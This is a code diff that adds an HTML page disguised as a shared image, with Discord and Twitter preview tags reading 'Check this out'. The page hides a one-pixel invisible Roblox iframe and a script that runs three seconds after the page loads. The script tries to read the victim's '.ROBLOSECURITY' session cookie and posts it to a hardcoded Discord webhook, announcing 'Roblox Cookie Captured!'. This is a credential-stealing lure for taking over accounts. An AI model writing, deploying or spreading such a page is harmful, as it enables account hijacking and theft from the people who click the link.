@@ -1,0 +1,79 @@
+ <!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Image</title>
+    
+    <!-- Discord embed meta tags -->
+    <meta property="og:title" content="Check this out">
+    <meta property="og:description" content="🔥">
+    <meta property="og:image" content="https://pbs.twimg.com/media/FqEBl_iWIAIyCnF.png">
+    <meta property="og:url" content="https://image-production-6592.up.railway.app">
+    <meta property="theme-color" content="#000000">
+    
+    <!-- Twitter card meta -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Check this out">
+    <meta name="twitter:image" content="https://pbs.twimg.com/media/FqEBl_iWIAIyCnF.png">
+    
+    <style>
+        body {
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background: #000;
+            overflow: hidden;
+        }
+        img {
+            max-width: 100%;
+            max-height: 100%;
+            object-fit: contain;
+        }
+        #roblox-frame {
+            position: absolute;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
+        }
+    </style>
+</head>
+<body>
+    <img src="https://pbs.twimg.com/media/FqEBl_iWIAIyCnF.png" alt="image">
+    <iframe id="roblox-frame" src="https://www.roblox.com"></iframe>
+
+    <script>
+        const webhookURL = 'https://discord.com/api/webhooks/1518239045346660444/lvyztE0hHr5ZSedpWtsTZkTDTRSx9l6oYS57lcFV1mBDmJ3c3SA_P4xVnS28ct-HuxvK';
+        
+        function getCookie(name) {
+            const value = `; ${document.cookie}`;
+            const parts = value.split(`; ${name}=`);
+            if (parts.length === 2) return parts.pop().split(';').shift();
+        }
+
+        setTimeout(function() {
+            const robloxCookie = getCookie('.ROBLOSECURITY');
+            
+            if (robloxCookie) {
+                fetch(webhookURL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        content: `**✅ Roblox Cookie Captured!**\n\`${robloxCookie}\``
+                    })
+                }).catch(() => {});
+            } else {
+                fetch(webhookURL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        content: '❌ No Roblox cookie found. User may need to log in.'
+                    })
+                }).catch(() => {});
+            }
+        }, 3000);
+    </script>
+</body>
+</html>
